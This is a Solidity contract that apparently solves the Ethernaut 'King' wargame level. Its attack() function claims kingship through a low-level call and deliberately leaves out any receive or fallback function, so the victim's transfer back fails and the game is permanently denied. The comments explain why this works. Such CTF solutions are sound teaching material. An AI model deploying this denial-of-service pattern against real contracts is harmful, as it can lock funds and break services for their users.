// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;

import "./King.sol";

import "hardhat/console.sol";

//Service denial by not implementing fallback functions for payable(king).transfer

contract Solution13 {
    King public victim;

    constructor(King victim_) public {
        victim = victim_;
    }

    function attack() external payable {
        //*
        //transfer -> the receiving smart contract should have a fallback function defined or else
        //the transfer call will throw an error. There is a gas limit of 2300 gas, which is enough
        //to complete the transfer operation. It is hardcoded to prevent reentrancy attacks.
        //*
        //payable(address(victim)).transfer(msg.value); //Will not work cause of gas limit

        (bool b, ) = address(victim).call{value:msg.value}("");
        require(b == true, "Something went wrong");
    }

    //receive() external payable {
        //Will fail payable(king).transfer(msg.value) if code will be added here

        //require(tx.origin != victim.owner(), "no reclaim kingship"); //no matter what line to add..
    //}
}
